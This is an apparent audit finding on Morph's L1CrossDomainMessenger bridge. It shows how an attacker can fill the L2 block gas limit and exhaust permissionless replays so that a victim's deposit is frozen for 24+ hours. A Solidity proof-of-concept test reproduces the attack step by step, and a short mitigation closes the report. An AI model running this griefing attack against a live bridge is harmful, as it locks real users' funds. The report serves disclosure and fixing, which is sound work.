# Any attacker can freeze depositing user funds for 24+ hours

### Summary

Because attackers can both cause deposits to be skipped and waste all replay attempts, any deposit can be costlessly and permissionlessly frozen until the L2 block is finalized, which will take at least 24 hours.

### Root Cause

In `L1CrossDomainMessenger.sol`, there is the ability to replay deposit transactions up to 3 (`maxReplayTimes`) times.

If, after 3 attempts, the transaction has not successfully landed in an L2 block, each of the three attempts will be marked as `skipped` in `Rollup.sol`. In this case, the `dropMessage()` function can be called to refund the deposited value to the original caller.

How is it determined if a transaction is skipped? If we examine the miner code in Morph's go-ethereum fork ([miner/pipeline.go#L276](https://github.com/morph-l2/go-ethereum/blob/e58ac01d16da31d9ca25a5e7e0e09bfdd352e76b/miner/pipeline.go#L276-L289)), we can see that if the gas limit is hit, the deposit transaction is marked as skipped. This allows an attacker to frontrun a deposit with other deposits that use the full block gas limit and ensure it is skipped.

Furthermore, the `replayMessage()` function can be permissionalessly called by anyone, not just the original depositor. This means that the attacker can backrun the transaction in the same block to use up all of the `maxReplayTimes` attempts, as all of these replays will be skipped since the block gas limit has been hit.

If this happens, the original user will have to call `dropMessage()` to get their funds back. However, this is not possible until the L2 block has been finalized, which will take at least 24 hours (more in the event of a challenged block).

Therefore, three facts are true:
1) An attacker can frontrun any deposit with other deposits that use the full block gas limit and ensure it is skipped.
2) An attacker can backrun this deposit to use up all the replay attempts.
3) The user will not be able to reclaim their frozen funds until the L2 block is finalized 24+ hours later.

### Internal pre-conditions

None

### External pre-conditions

None

### Attack Path

1. Attacker sees that a user is making a deposit via the L1CrossDomainMessenger.
2. Attacker frontruns the deposit transaction with 3 deposits that each use 10mm gas, which will fill the L2 block. Note that this can be done at no cost by replaying whitelisted transactions that have already succeeded (since the replay fee is based on the original depositor, not the replayer).
3. Attacker backruns the deposit transaction with 3 calls to `replayMessage()`, which use up all the replays.
4. The user's deposit fails, and they can't reclaim their funds for 24+ hours.

### Impact

Any user depositing funds via the bridge can be attacked at close to no cost to cause their deposited funds to be locked for at least 24 hours.

### PoC

The following test can be added to `L1CrossDomainMessenger.t.sol` to demonstrate the attack:
```solidity
function testPapa_freezeUserFunds() public {
    // a user with 2 ether wants to send 1 ether across the bridge
    address user = address(419);
    hevm.deal(user, 2 ether);

    // usually, he would make a call like the one below
    // messenger.sendMessage{value: 2 ether}(user, 1 ether, "", 100_000);

    // however, before he can, an attacker front runs and uses all the gas for the block
    // since txs are capped at 10mm gas, he'll pass 3
    uint attackerGas = l1MessageQueueWithGasPriceOracle.maxGasLimit();
    uint l2BaseFee = l1MessageQueueWithGasPriceOracle.l2BaseFee();

    // based on config, this will be less than 0.00004 ETH = 10 cents
    address attacker = address(420);
    hevm.deal(attacker, l2BaseFee * attackerGas * 4);

    // first, the attacker front runs the deposit to fill up the block with gas
    hevm.startPrank(attacker);
    for (uint i; i < 3; i++) {
        l1CrossDomainMessenger.sendMessage{value: l2BaseFee * attackerGas}(attacker, 0, "", attackerGas);
    }
    hevm.stopPrank();

    // the user's transaction then goes through (but will be skipped because the gas limit is hit)
    hevm.prank(user);
    uint32 userGas = 25_000;
    l1CrossDomainMessenger.sendMessage{value: 1 ether + l2BaseFee * userGas}(user, 1 ether, "", userGas);

    // the attacker then backruns the user and wastes all their replays
    hevm.startPrank(attacker);
    uint messageNonce = l1MessageQueueWithGasPriceOracle.nextCrossDomainMessageIndex() - 1;
    for (uint i; i < 3; i++) {
        l1CrossDomainMessenger.replayMessage{value: l2BaseFee * userGas}(user, user, 1 ether, messageNonce, "", userGas, attacker);
    }

    // now replays are no longer possible
    hevm.expectRevert("Exceed maximum replay times");
    l1CrossDomainMessenger.replayMessage{value: l2BaseFee * userGas}(user, user, 1 ether, messageNonce, "", userGas, attacker);

    // but the user is not able to drop their transaction until the block with the skipped transaction is finalized
    hevm.expectRevert("cannot drop pending message");
    l1CrossDomainMessenger.dropMessage(user, user, 1 ether, messageNonce, "");
}
```

### Mitigation

Only allow users to replay their own transactions.
